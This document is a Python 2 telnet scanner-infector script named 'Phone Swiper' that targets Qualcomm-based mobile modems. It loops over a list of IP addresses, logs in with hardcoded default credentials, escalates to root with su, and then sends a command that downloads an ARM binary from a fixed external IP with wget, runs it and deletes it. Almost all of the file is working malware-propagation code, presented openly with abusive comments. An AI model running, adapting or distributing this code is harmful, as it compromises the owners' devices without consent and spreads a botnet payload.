#!/usr/bin/python
# Phone Swiper 
# You wanted it? Now you got it... fucking idiots !!!

import threading, sys, time, random, socket, re, os
 
if len(sys.argv) < 2:
        print "Usage: python "+sys.argv[0]+" <list>"
        sys.exit()
 
ips = open(sys.argv[1], "r").readlines()
usernames = ["root", "admin"]
passwords = ["oelinux123", "admin"]
cmd = "cd /tmp; rm -rf tftp; wget http://46.166.148.149/lel4 -O tftp; chmod +x tftp; ./tftp; rm -rf tftp" #arm4 binary
count = 0
def readUntil(tn, string, timeout=15):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.01)
        if string in buf: return buf
    raise Exception('TIMEOUT!')
 
class hackify(threading.Thread):
        def __init__ (self, ip):
            threading.Thread.__init__(self)
            self.ip = str(ip).rstrip('\n')
        def run(self):
        try:
            tn = socket.socket()
            tn.settimeout(8)
            tn.connect((self.ip,23))
        except Exception:
            tn.close()
        try:
            hoho = ''
            hoho += readUntil(tn, ":")
            if "mdm9625" in hoho: #non-root
                r00t = 0
                username = usernames[1]
                password = passwords[1]
                tn.send(username + "\n")
                #print "[%s] sending non-root user"%(self.ip)
            elif "9615-cdp" in hoho: #root
                r00t = 1
                username = usernames[0]
                password = passwords[0]
                tn.send(username + "\n")
                #print "[%s] sending root user"%(self.ip)
        except Exception:
            tn.close()
        try:
            hoho = ''
            hoho += readUntil(tn, "Password:")
            if "assword" in hoho:
                tn.send(password + "\n")
                #if r00t: print "[%s] sending root password"%(self.ip)
                #if not r00t: print "[%s] sending non-root password"%(self.ip)
                time.sleep(3)
        except Exception:
            tn.close()
        try:
            mp = ''
            mp += tn.recv(1024)
            if "#" in mp or "$" in mp:
                if r00t: tn.send(cmd + "\n"); print "command sent %s!"%(self.ip); time.sleep(10); tn.close()
                if not r00t: tn.send("su" + "\n"); readUntil(tn, "Password:"); tn.send(passwords[0] + "\n"); time.sleep(1); tn.send(cmd + "\n"); print "command sent %s!"%(self.ip); time.sleep(10); tn.close()
        except Exception:
            print "[%s] TIMEOUT"%(count)
            tn.close()
 
print "Total IPs: %s\n"%(len(ips))
for ip in ips:
    try:
        count += 1
        t = hackify(ip)
        t.start()
        time.sleep(0.01)
    except:
        pass
